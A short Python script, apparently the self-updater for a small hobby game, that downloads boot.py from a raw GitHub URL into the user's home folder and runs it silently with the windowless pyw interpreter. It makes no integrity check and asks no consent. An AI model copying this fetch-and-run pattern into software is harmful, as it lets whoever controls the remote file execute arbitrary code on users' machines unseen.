# Updates the checker to the latest version

def main():
    def sleep(Time):
        import time as T
        T.sleep(Time)

    def download():
        sleep(.2)
        import os, urllib.request, pathlib, subprocess
        home = os.path.expanduser("~")
        os.chdir(home)
        dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/boot.py'
        path = str(home) + "/boot.pyw"
        try:
            os.remove('boot.pyw')
        except FileNotFoundError:
            print('Its Not Here')
        urllib.request.urlretrieve(dlurl, '{}'.format(path))
        #os.system('boot.pyw')
        subprocess.Popen(['pyw', 'boot.pyw'])
        exit()

    download()
main()